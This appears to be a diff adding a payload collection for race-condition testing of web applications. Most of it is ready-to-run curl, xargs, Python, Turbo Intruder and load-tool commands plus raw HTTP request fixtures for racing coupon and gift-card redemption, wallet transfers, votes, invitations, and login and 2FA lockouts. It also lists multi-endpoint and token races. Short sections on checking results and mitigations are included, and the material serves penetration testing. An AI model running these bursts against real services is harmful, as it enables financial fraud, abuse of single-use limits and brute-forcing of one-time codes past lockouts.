@@ -1,0 +1,149 @@
+# Race Condition Payloads
+# Commands and fixtures for parallel requests. Use test accounts, small amounts and a unique marker value per run.
+
+# Shell: many parallel identical requests with curl and xargs
+seq 1 30 | xargs -P 30 -I{} curl -s -o /dev/null -w "%{http_code}\n" -X POST https://app.example.test/api/coupon/redeem -H "Cookie: session=TEST_SESSION" -d "code=RACE-TEST"
+seq 1 20 | xargs -P 20 -I{} curl -s -X POST https://app.example.test/api/transfer -H "Cookie: session=TEST_SESSION" -H "Content-Type: application/json" -d '{"to":"test-account-2","amount":1}'
+seq 1 20 | xargs -P 20 -I{} curl -s -X POST https://app.example.test/api/like/POST_ID -H "Cookie: session=TEST_SESSION"
+seq 1 15 | xargs -P 15 -I{} curl -s -X POST https://app.example.test/api/invite/accept -H "Cookie: session=TEST_SESSION" -d "token=INVITE_TEST_TOKEN"
+seq 1 15 | xargs -P 15 -I{} curl -s -X POST https://app.example.test/api/gift-card/redeem -H "Cookie: session=TEST_SESSION" -d "code=GIFT-TEST"
+
+# Shell: HTTP/2 multiplexing in one connection with curl (requests are sent on one connection and interleaved)
+curl --http2 -s -Z --parallel-max 30 -X POST -d "code=RACE-TEST" -H "Cookie: session=TEST_SESSION" $(printf 'https://app.example.test/api/coupon/redeem %.0s' $(seq 1 30)) -o /dev/null
+curl --http2-prior-knowledge -s -Z --parallel-immediate -X POST -d "code=RACE-TEST" -H "Cookie: session=TEST_SESSION" $(printf 'https://app.example.test/api/coupon/redeem %.0s' $(seq 1 30)) -o /dev/null
+
+# Python asyncio: send N requests concurrently over separate connections
+python3 -c "import asyncio,aiohttp;exec('async def go():\n async with aiohttp.ClientSession(headers={\"Cookie\":\"session=TEST_SESSION\"}) as s:\n  r=await asyncio.gather(*[s.post(\"https://app.example.test/api/coupon/redeem\",data={\"code\":\"RACE-TEST\"}) for _ in range(30)])\n  print([x.status for x in r])');asyncio.run(go())"
+python3 -c "import threading,requests;r=[];t=[threading.Thread(target=lambda:r.append(requests.post('https://app.example.test/api/coupon/redeem',data={'code':'RACE-TEST'},headers={'Cookie':'session=TEST_SESSION'}).status_code)) for _ in range(30)];[x.start() for x in t];[x.join() for x in t];print(sorted(r))"
+
+# Burp Repeater: create a group of identical requests (duplicate the tab N times), then use Send group in parallel
+# Burp Repeater: choose "Send group in parallel (single-packet attack)" for HTTP/2 targets and "Send group in parallel (last-byte sync)" for HTTP/1.1 targets
+
+# Turbo Intruder: single-packet attack template (HTTP/2 engine, gate synchronises the final frames)
+# def queueRequests(target, wordlists):
+#     engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=1, engine=Engine.BURP2)
+#     for i in range(30):
+#         engine.queue(target.req, gate='race1')
+#     engine.openGate('race1')
+
+# Turbo Intruder: HTTP/1.1 last-byte sync with many connections
+# def queueRequests(target, wordlists):
+#     engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=20, requestsPerConnection=1, pipeline=False)
+#     for i in range(20):
+#         engine.queue(target.req, gate='race1')
+#     engine.openGate('race1')
+
+# Turbo Intruder: distinct values per request (each request carries a different guess, for example a code or username)
+# def queueRequests(target, wordlists):
+#     engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=1, engine=Engine.BURP2)
+#     for word in open('/path/to/guesses.txt'):
+#         engine.queue(target.req, word.strip(), gate='race1')
+#     engine.openGate('race1')
+
+# Connection warm-up: send a harmless request first so the first race request does not pay the TLS and routing cost
+GET /health HTTP/2
+GET / HTTP/2
+OPTIONS / HTTP/2
+
+# Limit overrun: scenarios to test (single-use or capped operations)
+# Redeem one coupon, gift card or voucher in many parallel requests
+# Withdraw, transfer or spend an amount near the balance in many parallel requests
+# Apply a discount code at checkout repeatedly in parallel
+# Claim a one-time reward, trial or free credit
+# Vote, like, rate or follow beyond the allowed count
+# Accept the same invitation or share link from several sessions
+# Send the same verification, password reset or invitation email many times beyond the limit
+# Create more resources than the plan limit (projects, API keys, seats)
+# Use the same single-use token (reset, magic link, OTP) from several sessions
+
+# Rate-limit and lockout overrun: make the wrong attempts in parallel so they pass before the counter increments
+seq 1 40 | xargs -P 40 -I{} curl -s -o /dev/null -w "%{http_code}\n" -X POST https://app.example.test/login -d "user=test&pass=wrong{}"
+seq 1 40 | xargs -P 40 -I{} curl -s -o /dev/null -w "%{http_code}\n" -X POST https://app.example.test/2fa/verify -b "session=TEST_SESSION" -d "otp=00000{}"
+
+# Multi-endpoint races (two different requests at the same moment)
+# Send checkout payment and cart modification together; check which price is charged and which items ship
+# Send email-change and email-confirmation together; check the final verified address
+# Send password-reset request and password-change together; check which token is valid
+# Send role-change and a privileged action together; check that the action cannot use the old role
+# Send delete and update on the same object together; check for orphaned data
+# Send logout or session revocation and an authenticated request together
+
+# Time-of-check to time-of-use on files (create and replace objects between validation and use)
+# Upload a valid file and request it while the server is still validating or scanning it
+# Rename or replace a path between the existence check and the read
+# Swap a symlink target between validation and open (see Symbolic-Link-Attacks)
+# Overwrite an uploaded file name with the same name in a second request
+
+# Partial construction and state confusion
+# Register and use the account before the email-verification record is created
+# Log in during account creation before default roles or permissions are applied
+# Create an object and read it before required fields or ownership are set
+# Submit a multi-step form from several tabs with different step values
+GET /api/object/ID?include=owner,permissions
+POST /api/register with {"email":"race-test@example.test","password":"RaceTest1!"}
+POST /api/register with {"email":"race-test@example.test","password":"RaceTest2!"}
+
+# Token and identifier races
+# Request many reset tokens at the same moment and check for duplicates or sequences
+# Request many API keys, order numbers or invoice numbers at the same moment and check for duplicates
+# Request account creation with the same username in parallel and check for duplicates (missing unique constraint)
+POST /api/register with {"username":"race-user"} sent 20 times in parallel
+POST /api/orders sent 20 times in parallel and compare the returned order IDs
+
+# Verification of results (check state, not only HTTP status)
+# Balance and counter after the run
+# Number of resources created
+# Number of emails received
+# Audit log entries
+# Duplicate rows (an admin view or export on your own test data)
+
+# Mitigation checks
+# A database transaction with a row lock or an atomic update (UPDATE ... WHERE used = false)
+# A unique constraint on single-use tokens and identifiers
+# An idempotency key accepted once per operation
+# A per-user or per-resource mutex or queue for the critical operation
+
+# Raw request fixtures (escaped bytes; send the same request many times in one parallel group, replace Content-Length with the real body length)
+POST /api/coupons/redeem HTTP/1.1\r\nHost: app.example.test\r\nCookie: session=TEST_SESSION\r\nContent-Type: application/json\r\nContent-Length: <length>\r\n\r\n{"code":"RACE-TEST"}
+POST /api/gift-cards/redeem HTTP/1.1\r\nHost: app.example.test\r\nCookie: session=TEST_SESSION\r\nContent-Type: application/json\r\nContent-Length: <length>\r\n\r\n{"code":"GIFT-RACE-TEST"}
+POST /api/wallet/withdraw HTTP/1.1\r\nHost: app.example.test\r\nCookie: session=TEST_SESSION\r\nContent-Type: application/json\r\nContent-Length: <length>\r\n\r\n{"amount":1,"to":"test-account-2"}
+POST /api/wallet/transfer HTTP/1.1\r\nHost: app.example.test\r\nCookie: session=TEST_SESSION\r\nContent-Type: application/json\r\nContent-Length: <length>\r\n\r\n{"to":"test-account-2","amount":1}
+POST /api/posts/POST_ID/like HTTP/1.1\r\nHost: app.example.test\r\nCookie: session=TEST_SESSION\r\nContent-Type: application/json\r\nContent-Length: <length>\r\n\r\n{}
+POST /api/polls/POLL_ID/vote HTTP/1.1\r\nHost: app.example.test\r\nCookie: session=TEST_SESSION\r\nContent-Type: application/json\r\nContent-Length: <length>\r\n\r\n{"option":1}
+POST /api/invites/accept HTTP/1.1\r\nHost: app.example.test\r\nCookie: session=TEST_SESSION\r\nContent-Type: application/json\r\nContent-Length: <length>\r\n\r\n{"token":"INVITE_TEST_TOKEN"}
+POST /api/referrals/claim HTTP/1.1\r\nHost: app.example.test\r\nCookie: session=TEST_SESSION\r\nContent-Type: application/json\r\nContent-Length: <length>\r\n\r\n{"code":"REF-RACE-TEST"}
+POST /api/trials/start HTTP/1.1\r\nHost: app.example.test\r\nCookie: session=TEST_SESSION\r\nContent-Type: application/json\r\nContent-Length: <length>\r\n\r\n{"plan":"pro"}
+POST /api/rewards/claim HTTP/1.1\r\nHost: app.example.test\r\nCookie: session=TEST_SESSION\r\nContent-Type: application/json\r\nContent-Length: <length>\r\n\r\n{"reward_id":"REWARD_ID"}
+POST /api/cart/apply-discount HTTP/1.1\r\nHost: app.example.test\r\nCookie: session=TEST_SESSION\r\nContent-Type: application/json\r\nContent-Length: <length>\r\n\r\n{"code":"RACE-TEST"}
+POST /api/checkout/confirm HTTP/1.1\r\nHost: app.example.test\r\nCookie: session=TEST_SESSION\r\nContent-Type: application/json\r\nContent-Length: <length>\r\n\r\n{"cart_id":"CART_ID"}
+POST /api/account/email/confirm HTTP/1.1\r\nHost: app.example.test\r\nCookie: session=TEST_SESSION\r\nContent-Type: application/json\r\nContent-Length: <length>\r\n\r\n{"token":"EMAIL_TEST_TOKEN"}
+POST /api/password/reset/confirm HTTP/1.1\r\nHost: app.example.test\r\nCookie: session=TEST_SESSION\r\nContent-Type: application/json\r\nContent-Length: <length>\r\n\r\n{"token":"RESET_TEST_TOKEN","password":"RaceTest1!"}
+POST /api/auth/register HTTP/1.1\r\nHost: app.example.test\r\nCookie: session=TEST_SESSION\r\nContent-Type: application/json\r\nContent-Length: <length>\r\n\r\n{"email":"race-test@example.test","password":"RaceTest1!"}
+POST /api/keys/create HTTP/1.1\r\nHost: app.example.test\r\nCookie: session=TEST_SESSION\r\nContent-Type: application/json\r\nContent-Length: <length>\r\n\r\n{"name":"race-key"}
+POST /api/projects/create HTTP/1.1\r\nHost: app.example.test\r\nCookie: session=TEST_SESSION\r\nContent-Type: application/json\r\nContent-Length: <length>\r\n\r\n{"name":"race-project"}
+POST /api/seats/add HTTP/1.1\r\nHost: app.example.test\r\nCookie: session=TEST_SESSION\r\nContent-Type: application/json\r\nContent-Length: <length>\r\n\r\n{"email":"race-seat@example.test"}
+POST /api/2fa/verify HTTP/1.1\r\nHost: app.example.test\r\nCookie: session=TEST_SESSION\r\nContent-Type: application/json\r\nContent-Length: <length>\r\n\r\n{"otp":"000000"}
+POST /api/export/start HTTP/1.1\r\nHost: app.example.test\r\nCookie: session=TEST_SESSION\r\nContent-Type: application/json\r\nContent-Length: <length>\r\n\r\n{"format":"csv"}
+
+# Raw request fixtures: two different requests in the same group (multi-endpoint race)
+POST /api/email/change HTTP/1.1\r\nHost: app.example.test\r\nCookie: session=TEST_SESSION\r\nContent-Type: application/json\r\nContent-Length: <length>\r\n\r\n{"email":"race-new@example.test"}
+POST /api/email/confirm HTTP/1.1\r\nHost: app.example.test\r\nCookie: session=TEST_SESSION\r\nContent-Type: application/json\r\nContent-Length: <length>\r\n\r\n{"token":"EMAIL_TEST_TOKEN"}
+POST /api/cart/items HTTP/1.1\r\nHost: app.example.test\r\nCookie: session=TEST_SESSION\r\nContent-Type: application/json\r\nContent-Length: <length>\r\n\r\n{"sku":"EXPENSIVE_SKU","qty":1}
+POST /api/payment/capture HTTP/1.1\r\nHost: app.example.test\r\nCookie: session=TEST_SESSION\r\nContent-Type: application/json\r\nContent-Length: <length>\r\n\r\n{"cart_id":"CART_ID"}
+
+# Load tools configured for a synchronised burst (own test environment, small counts)
+hey -n 30 -c 30 -m POST -H 'Cookie: session=TEST_SESSION' -H 'Content-Type: application/json' -d '{"code":"RACE-TEST"}' https://app.example.test/api/coupons/redeem
+bombardier -c 30 -n 30 -m POST -H 'Cookie: session=TEST_SESSION' -H 'Content-Type: application/json' -f body.json https://app.example.test/api/coupons/redeem
+ab -n 30 -c 30 -p body.json -T application/json -C session=TEST_SESSION https://app.example.test/api/coupons/redeem
+wrk -t1 -c30 -d1s -s post.lua https://app.example.test/api/coupons/redeem
+echo 'POST https://app.example.test/api/coupons/redeem' | vegeta attack -rate=30 -duration=1s -body=body.json -header='Cookie: session=TEST_SESSION' | vegeta report
+ghz --insecure -c 30 -n 30 --call example.CouponService/Redeem -d '{"code":"RACE-TEST"}' app.example.test:50051
+xargs -P 30 -I{} sh -c 'curl -s -o /dev/null -w "%{http_code}\n" -X POST -b session=TEST_SESSION -d code=RACE-TEST https://app.example.test/api/coupons/redeem' < <(seq 1 30)
+parallel -j 30 curl -s -o /dev/null -w '%{http_code}\n' -X POST -b session=TEST_SESSION -d code=RACE-TEST https://app.example.test/api/coupons/redeem ::: $(seq 1 30)
+
+# Analysis commands for the results
+sort | uniq -c
+curl -s -b session=TEST_SESSION https://app.example.test/api/wallet/balance
+curl -s -b session=TEST_SESSION https://app.example.test/api/coupons/used
+curl -s -b session=TEST_SESSION https://app.example.test/api/votes/count
+curl -s -b session=TEST_SESSION https://app.example.test/api/orders?limit=50
